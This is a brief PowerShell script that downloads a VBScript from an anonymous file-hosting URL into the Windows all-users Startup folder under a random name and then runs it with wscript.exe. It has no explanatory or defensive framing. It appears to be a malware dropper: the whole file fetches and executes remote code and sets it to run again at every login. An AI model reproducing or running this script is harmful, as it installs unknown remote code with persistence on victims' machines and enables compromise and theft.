$url = "https://files.catbox.moe/0esiva.vbs"
$destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"


# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination

 # Run the VBScript
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination`"" -NoNewWindow 
exit
